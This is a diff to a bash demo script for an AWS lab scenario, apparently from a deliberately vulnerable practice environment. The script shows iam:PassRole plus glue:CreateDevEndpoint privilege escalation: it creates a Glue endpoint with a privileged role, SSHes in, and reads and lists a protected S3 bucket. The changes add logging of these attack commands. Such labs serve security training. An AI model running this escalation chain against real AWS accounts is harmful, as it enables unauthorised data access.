@@ -3,7 +3,9 @@
 # Demo script for iam:PassRole + glue:CreateDevEndpoint privilege escalation
 # This scenario demonstrates how a user with PassRole and CreateDevEndpoint can escalate to bucket access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-glue-001-to-bucket-starting-user"
@@ -76,6 +96,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -87,6 +108,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -104,6 +126,7 @@ fi
 
 echo "Target bucket: $BUCKET_NAME"
 echo "Attempting to access bucket: $BUCKET_NAME"
+show_cmd aws s3 ls s3://$BUCKET_NAME
 if aws s3 ls s3://$BUCKET_NAME &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -140,6 +163,7 @@ echo "This is the privilege escalation vector - passing the S3-privileged role t
 echo -e "${YELLOW}Creating endpoint (this may take 5-10 minutes)...${NC}"
 
 # Create the dev endpoint
+show_attack_cmd aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN --public-key "$SSH_PUBLIC_KEY" --glue-version "1.0" --number-of-nodes 2 --region $AWS_REGION --output json
 aws glue create-dev-endpoint \
     --endpoint-name $ENDPOINT_NAME \
     --role-arn $ROLE_ARN \
@@ -200,6 +224,7 @@ fi
 
 # Step 8: Get endpoint SSH address
 echo -e "${YELLOW}Step 8: Retrieving endpoint connection details${NC}"
+show_cmd aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --endpoint-name $ENDPOINT_NAME \
     --region $AWS_REGION \
@@ -238,6 +263,7 @@ while [ $SSH_RETRY -lt $MAX_SSH_RETRIES ]; do
     echo "Attempting SSH connection (attempt $((SSH_RETRY + 1))/$MAX_SSH_RETRIES)..."
 
     # Execute AWS CLI command on the endpoint to read the sensitive file
+    show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -
     SENSITIVE_DATA=$(ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
         "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -" 2>/dev/null || echo "")
 
@@ -279,6 +305,7 @@ echo -e "${YELLOW}Step 12: Listing bucket contents to demonstrate full access${N
 echo "Listing all objects in bucket..."
 echo ""
 
+show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
 ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
     "aws s3 ls s3://$BUCKET_NAME/"
 
@@ -303,6 +330,14 @@ echo -e "  $STARTING_USER → (glue:CreateDevEndpoint + iam:PassRole)"
 echo -e "  → Glue Dev Endpoint with $TARGET_ROLE"
 echo -e "  → SSH Access → S3 Bucket Access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo ""
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Glue dev endpoint: $ENDPOINT_NAME"
 echo "- SSH key pair: ${SSH_KEY_PATH} / ${SSH_KEY_PATH}.pub"
@@ -313,3 +348,6 @@ echo ""
 echo -e "${YELLOW}To clean up and stop costs:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
